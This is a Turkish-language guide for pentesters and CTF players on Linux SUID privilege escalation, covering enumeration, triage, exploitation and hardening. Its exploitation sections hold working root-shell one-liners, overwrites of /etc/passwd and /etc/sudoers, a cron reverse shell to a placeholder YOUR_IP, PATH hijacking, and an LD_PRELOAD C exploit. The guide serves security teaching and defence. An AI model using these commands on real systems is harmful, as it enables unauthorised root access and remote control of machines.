# A'dan Z'ye SUID ile Ayrıcalık Yükseltme: Ultimate Pentester Rehberi

Bu rehber, Linux sistemlerindeki **SUID (Set User ID)** tabanlı ayrıcalık yükseltme zafiyetlerinin derinlemesine bir analizini sunar. Amacı, sızma testi uzmanlarına (pentester), CTF oyuncularına ve sistem yöneticilerine bu kritik zafiyet vektörünü **keşfetme, analiz etme, sömürme ve önleme** konularında eksiksiz bir kaynak sağlamaktır.

---

## 📖 İçindekiler

1.  [**Bölüm 1: Temel Teorik Altyapı**](#bölüm-1-temel-teorik-altyapı)
    *   [1.1. Linux İzin Modeli: Bir Hatırlatma](#11-linux-i̇zin-modeli-bir-hatırlatma)
    *   [1.2. Özel İzinler: SUID, SGID ve Sticky Bit](#12-özel-i̇zinler-suid-sgid-ve-sticky-bit)
    *   [1.3. SUID'in İç İşleyişi: `uid`, `euid` ve `suid` Farkı](#13-suidin-i̇ç-i̇şleyişi-uid-euid-ve-suid-farkı)
    *   [1.4. Meşru Kullanım Senaryoları](#14-meşru-kullanım-senaryoları)

2.  [**Bölüm 2: Pentester Metodolojisi (Kill Chain)**](#bölüm-2-pentester-metodolojisi-kill-chain)
    *   [2.1. **Aşama 1: Keşif (Enumeration)**](#21-aşama-1-keşif-enumeration)
    *   [2.2. **Aşama 2: Analiz ve Önceliklendirme (Triage)**](#22-aşama-2-analiz-ve-önceliklendirme-triage)
    *   [2.3. **Aşama 3: Sömürü (Exploitation)**](#23-aşama-3-sömürü-exploitation)

3.  [**Bölüm 3: Sömürü Teknikleri ve Cephanelik**](#bölüm-3-sömürü-teknikleri-ve-cephanelik)
    *   [3.1. Doğrudan Komut Çalıştırma ve Shell Elde Etme](#31-doğrudan-komut-çalıştırma-ve-shell-elde-etme)
    *   [3.2. Dosya Okuma/Yazma ile Yetki Yükseltme](#32-dosya-okumayazma-ile-yetki-yükseltme)
    *   [3.3. İleri Düzey: Ortam Değişkeni Manipülasyonu](#33-i̇leri-düzey-ortam-değişkeni-manipülasyonu)
    *   [3.4. İleri Düzey: Shared Object (Kütüphane) Injection](#34-i̇leri-düzey-shared-object-kütüphane-injection)

4.  [**Bölüm 4: Savunma ve Önleme (Blue & Purple Team Perspektifi)**](#bölüm-4-savunma-ve-önleme-blue--purple-team-perspektifi)
    *   [4.1. Proaktif Hardening Teknikleri](#41-proaktif-hardening-teknikleri)
    *   [4.2. Tespit ve İzleme (Auditing)](#42-tespit-ve-i̇zleme-auditing)

5.  [**Bölüm 5: Hızlı Başvuru Notları (Cheatsheet) ve Kaynaklar**](#bölüm-5-hızlı-başvuru-notları-cheatsheet-ve-kaynaklar)

---

## Bölüm 1: Temel Teorik Altyapı

Sömürüye geçmeden önce, mekanizmayı anlamak esastır.

### 1.1. Linux İzin Modeli: Bir Hatırlatma

| İzin        | Sembol | Oktal Değer | Açıklama                        |
|-------------|:------:|:-----------:|---------------------------------|
| **Okuma**   | `r`    | `4`         | Dosya içeriğini okuma, dizini listeleme |
| **Yazma**   | `w`    | `2`         | Dosyayı değiştirme, dizinde dosya oluşturma/silme |
| **Çalıştırma** | `x`    | `1`         | Dosyayı çalıştırma, dizine girme (`cd`) |

### 1.2. Özel İzinler: SUID, SGID ve Sticky Bit

| İzin        | Sembol | Oktal Değer | Açıklama                                                                |
|-------------|:------:|:-----------:|-------------------------------------------------------------------------|
| **SUID**    | `s` (u) | `4000`      | Çalıştıran kullanıcı, dosya **sahibinin** yetkilerini alır.                 |
| **SGID**    | `s` (g) | `2000`      | Çalıştıran kullanıcı, dosya **grubunun** yetkilerini alır.                 |
| **Sticky Bit** | `t` (o) | `1000`      | Bir dizinde, sadece dosya sahibi (ve root) dosyayı silebilir/yeniden adlandırabilir. |

Bu rehber **SUID** (`-rwsr-xr-x`) üzerine odaklanmıştır.

### 1.3. SUID'in İç İşleyişi: `uid`, `euid` ve `suid` Farkı

Bir SUID binary çalıştırıldığında, işletim sistemi proses için kimlik bilgilerini şöyle yönetir:

*   **Real User ID (`uid`):** Prosesi başlatan gerçek kullanıcının ID'si. (Örn: `ahmet`, uid=1001)
*   **Effective User ID (`euid`):** Prosesin izin kontrolü için kullandığı ID. SUID'li bir binary için bu, dosya sahibinin ID'si olur. (Örn: `root`, euid=0)
*   **Saved User ID (`suid`):** `euid`'nin bir kopyasını tutar, böylece proses daha sonra orijinal yetkilerine dönebilir.

`id` komutu bu durumu net bir şekilde gösterir:
```bash
# Normal kullanıcı kabuğunda
$ id
uid=1001(ahmet) gid=1001(ahmet) groups=1001(ahmet)

# SUID'li bir bash çalıştırdıktan sonra (bash -p)
$ bash -p
# id
uid=1001(ahmet) gid=1001(ahmet) euid=0(root) groups=1001(ahmet)
```
Gördüğünüz gibi, `euid` (effective UID) artık `root`'tur. Bu, dosya sistemi işlemlerinde `root` yetkisine sahip olduğumuz anlamına gelir.

### 1.4. Meşru Kullanım Senaryoları

*   `/usr/bin/passwd`: Kullanıcıların kendi şifrelerini `/etc/shadow` dosyasına (sadece root yazabilir) yazabilmesini sağlar.
*   `/usr/bin/ping`: Normal kullanıcıların ağ soketleri oluşturmak için gereken ham soket ayrıcalıklarını elde etmesini sağlar.
*   `/usr/bin/mount`: Normal kullanıcıların belirli aygıtları mount etmesine izin verir.

---

## Bölüm 2: Pentester Metodolojisi (Kill Chain)

### 2.1. Aşama 1: Keşif (Enumeration)

İlk adım, potansiyel hedefleri bulmaktır.

#### Manuel Komutlar

En temel ve güvenilir yöntem `find` komutudur:
```bash
# Sadece SUID bitini ara (En yaygın)
find / -perm -u=s -type f 2>/dev/null

# Sadece SGID bitini ara
find / -perm -g=s -type f 2>/dev/null

# Hem SUID hem de SGID bitlerini ara
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Daha okunaklı bir çıktı için ls -l ile birleştir
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
```

#### Otomatik Scriptler

Bu scriptler, bulguları renklendirerek ve bilinen zafiyetli binary'leri işaretleyerek süreci hızlandırır:
*   **LinPEAS:** [github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
*   **LinEnum:** [github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

### 2.2. Aşama 2: Analiz ve Önceliklendirme (Triage)

`find` komutunun çıktısı uzun bir liste olabilir. Bu listeyi analiz ederek "altın yumurtlayan tavukları" bulmamız gerekir.

| Kategori                        | Örnekler                                    | Aksiyon                                                                      |
|---------------------------------|---------------------------------------------|------------------------------------------------------------------------------|
| **Neredeyse Her Zaman Güvenli** | `passwd`, `su`, `mount`, `ping`, `chsh`     | Genellikle göz ardı edilebilir, unless çok eski bir sistem ise.                    |
| **Anında İncele (Yüksek Risk)** | `bash`, `sh`, `find`, `cp`, `mv`, `nmap`, `vim`, `nano`, `python`, `perl`, `ruby`, `php`, `gcc`, `gdb`, `strace` | **GTFOBins'e koş!** Bunlar genellikle doğrudan sömürülebilir.              |
| **Bağlama Göre Değişir**        | `cat`, `less`, `more`, `tail`, `head`, `awk`, `sed` | Genellikle sadece dosya okumaya izin verirler, ama belki hassas bir konfigürasyon dosyasını (`/etc/shadow`) okuyabilirler. |
| **Özel/Bilinmeyen Binary'ler**  | `/usr/local/bin/backup`, `/opt/admin/tool`  | En heyecan verici olanlar. `strings`, `ltrace`, `strace` ile analiz et. |

> **Pro-Tip: Analiz Araçları**
> Bilinmeyen bir SUID binary'si bulduğunuzda, ne yaptığını anlamak için:
> ```bash
> # Binary içindeki metinleri (string) göster
> strings /path/to/suid_binary
> 
> # Hangi kütüphane çağrılarını yaptığını izle
> ltrace /path/to/suid_binary
> 
> # Hangi sistem çağrılarını (syscall) yaptığını izle (Çok güçlü!)
> strace /path/to/suid_binary
> ```
> `strace` çıktısında `execve` veya `system()` gibi fonksiyon çağrıları aramak, PATH Hijacking gibi zafiyetleri ortaya çıkarabilir.

### 2.3. Aşama 3: Sömürü (Exploitation)

Analiz tamamlandığında, sıra sömürüye gelir. En güvenilir kaynağınız her zaman **[GTFOBins](https://gtfobins.github.io/)** olmalıdır.

---

## Bölüm 3: Sömürü Teknikleri ve Cephanelik

### 3.1. Doğrudan Komut Çalıştırma ve Shell Elde Etme

Bu, en basit ve en etkili yöntemdir.

| Binary | Sömürü Komutu                                        |
|--------|------------------------------------------------------|
| `bash` | `bash -p`                                            |
| `find` | `find . -exec /bin/sh -p \; -quit`                   |
| `vim`  | `vim -c ':!/bin/sh'`                                 |
| `nmap` | `nmap --interactive` (sonra `!sh`)                   |
| `python`| `python -c 'import os; os.system("/bin/sh")'`         |
| `php`  | `php -r "system('/bin/sh');"`                        |
| `perl` | `perl -e 'exec "/bin/sh";'`                          |
| `ruby` | `ruby -e 'exec "/bin/sh"'`                           |

### 3.2. Dosya Okuma/Yazma ile Yetki Yükseltme

Eğer SUID'li binary doğrudan shell vermiyor ama dosya işlemleri yapabiliyorsa, yaratıcı olmalıyız.

#### Strateji 1: Hassas Dosyaları Okuma

`cat`, `less`, `more`, `tail` gibi komutlar SUID'li ise, normalde okuyamayacağınız dosyaları okuyabilirsiniz.
```bash
# /etc/shadow dosyasındaki root hash'ini oku
/usr/bin/cat /etc/shadow

# SSH özel anahtarını oku
/usr/bin/less /root/.ssh/id_rsa
```
Elde edilen hash'ler `John the Ripper` veya `Hashcat` ile kırılabilir.

#### Strateji 2: Kritik Dosyaların Üzerine Yazma

`cp`, `mv`, `dd`, `tee` gibi komutlar SUID'li ise, bu en tehlikeli senaryolardan biridir.

*   **`/etc/passwd` Manipülasyonu:**
    1.  Parolasız yeni bir root kullanıcısı oluştur: `hacker::0:0:hacker:/root:/bin/bash`
    2.  Bunu geçici bir dosyaya yaz: `echo "hacker::0:0:hacker:/root:/bin/bash" > /tmp/new_passwd`
    3.  `cp` ile üzerine yaz: `cp /tmp/new_passwd /etc/passwd`
    4.  `su hacker` ile `root` ol.

*   **`/etc/sudoers` Manipülasyonu:**
    1.  Kendi kullanıcımıza (`ahmet`) parolasız `sudo` hakkı ver: `ahmet ALL=(ALL) NOPASSWD: ALL`
    2.  Bunu geçici dosyaya yaz: `echo "ahmet ALL=(ALL) NOPASSWD: ALL" > /tmp/sudo_rule`
    3.  `tee` ile `sudoers` dosyasına ekle: `tee -a /etc/sudoers < /tmp/sudo_rule`
    4.  `sudo su` ile `root` ol.

*   **Cron Job Oluşturma:**
    1.  Ters kabuk (reverse shell) veren bir cron job oluştur: `echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'" > /etc/cron.d/shell`
    2.  Bir dakika bekle ve dinleyicide (listener) shell'i yakala.

### 3.3. İleri Düzey: Ortam Değişkeni Manipülasyonu

#### PATH Hijacking

Eğer bir SUID'li program, başka bir programı tam yoluyla (`/bin/ls`) değil de sadece adıyla (`ls`) çağırıyorsa, bu zafiyetten faydalanabiliriz.

1.  **Analiz:** `strace /path/to/suid_program` komutunu çalıştır ve `execve("program_ismi", ...)` gibi bir satır ara. Eğer `program_ismi` başında `/` yoksa, zafiyetlidir.
2.  **Sömürü:**
    ```bash
    # 1. Kendi zararlı komutumuzu oluştur (örneğin "ls" adıyla)
    echo "/bin/sh -p" > /tmp/ls
    chmod +x /tmp/ls

    # 2. PATH değişkenimizin başına /tmp dizinini ekle
    export PATH=/tmp:$PATH

    # 3. Zafiyetli SUID programını çalıştır
    /path/to/suid_program
    ```
    Program, `ls` komutunu ararken ilk olarak `/tmp` dizinine bakacak ve bizim zararlı script'imizi `root` yetkileriyle çalıştıracaktır.

### 3.4. İleri Düzey: Shared Object (Kütüphane) Injection

Bu teknik, SUID'li bir programın kullandığı kütüphaneyi, `LD_PRELOAD` ortam değişkeni aracılığıyla kendi zararlı kütüphanemizle değiştirmeye dayanır.

> **⚠️ Uyarı:** Modern Linux dağıtımları, güvenlik nedeniyle SUID'li prosesler için `LD_PRELOAD`'ı genellikle devre dışı bırakır (`/etc/ld.so.conf`). Bu nedenle bu teknik daha çok eski veya yanlış yapılandırılmış sistemlerde işe yarar.

1.  **Zararlı Kütüphane Kodu (`exploit.c`):**
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    // Bu fonksiyon, kütüphane yüklendiğinde otomatik olarak çalışır.
    void _init() {
        unsetenv("LD_PRELOAD"); // Sonsuz döngüyü engelle
        setresuid(0, 0, 0);       // uid, euid, suid'yi root yap
        system("/bin/sh -p");     // root shell'i başlat
    }
    ```
2.  **Derleme:**
    ```bash
    gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
    ```
3.  **Sömürü:**
    ```bash
    LD_PRELOAD=/tmp/exploit.so /path/to/suid_program
    ```

---

## Bölüm 4: Savunma ve Önleme (Blue & Purple Team Perspektifi)

### 4.1. Proaktif Hardening Teknikleri

*   **En Az Yetki Prensibi:** Gerekmedikçe **ASLA** bir dosyaya SUID biti vermeyin. Bir geliştirici bunu istiyorsa, alternatif bir çözüm (örn: `sudo` kuralları, polkit) sunun.
*   **`nosuid` Mount Seçeneği:** `/etc/fstab` dosyasında, kullanıcıların yazma erişimi olan (`/home`, `/tmp`, `/var/tmp`, `/dev/shm`) tüm partisyonları `nosuid` seçeneğiyle bağlayın. Bu, bir saldırganın bu dizinlere yüklediği SUID'li bir binary'nin çalışmasını engeller.
    ```
    /dev/sda3   /home   ext4   defaults,nosuid   1 2
    ```
*   **Güvenli Kodlama:** SUID'li bir program yazmak zorundaysanız:
    *   Tüm harici komutları mutlak yollarıyla (`/bin/ls`) çağırın.
    *   `PATH`, `LD_PRELOAD`, `IFS` gibi ortam değişkenlerine güvenmeyin, programın başında bunları temizleyin.
    *   Mümkün olan en kısa sürede `setuid(getuid())` çağrısı ile yetkileri düşürün.

### 4.2. Tespit ve İzleme (Auditing)

*   **Periyodik Taramalar:** Yukarıda belirtilen `find` komutlarını bir cron job'a ekleyerek sistemdeki SUID'li dosyaların listesini düzenli olarak kontrol edin ve beklenmedik değişiklikleri tespit edin.
*   **Linux `auditd`:** `auditd` servisi ile SUID'li dosyaların çalıştırılmasını veya dosya izinlerinin değiştirilmesini loglayabilirsiniz.
    ```bash
    # SUID/SGID bitlerinin ayarlanmasını izle
    auditctl -a always,exit -F arch=b64 -S chmod -S fchmod -F a0&07000
    ```

---

## Bölüm 5: Hızlı Başvuru Notları (Cheatsheet) ve Kaynaklar

### Cheatsheet

| Amaç                          | Komut                                                              |
|-------------------------------|--------------------------------------------------------------------|
| SUID'li Dosyaları Bulma        | `find / -perm -u=s -type f 2>/dev/null`                              |
| `bash` ile Shell              | `bash -p`                                                          |
| `find` ile Shell              | `find . -exec /bin/sh -p \; -quit`                                   |
| `cp` ile `/etc/passwd` üzerine yazma | `cp /tmp/new_passwd /etc/passwd`                                   |
| `LD_PRELOAD` Shell            | `LD_PRELOAD=/tmp/exploit.so /path/to/binary`                       |
| `PATH` Hijacking Shell        | `export PATH=/tmp:$PATH; /path/to/binary`                          |

### Harici Kaynaklar

*   **GTFOBins:** Zafiyetli Unix binary'leri için İncil.
    *   [https://gtfobins.github.io/](https://gtfobins.github.io/)
*   **HackTricks:** Kapsamlı pentest ve privilege escalation rehberleri.
    *   [https://book.hacktricks.xyz/linux-hardening/privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
*   **PayloadsAllTheThings:** Her türlü payload ve sömürü tekniği koleksiyonu.
    *   [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

```
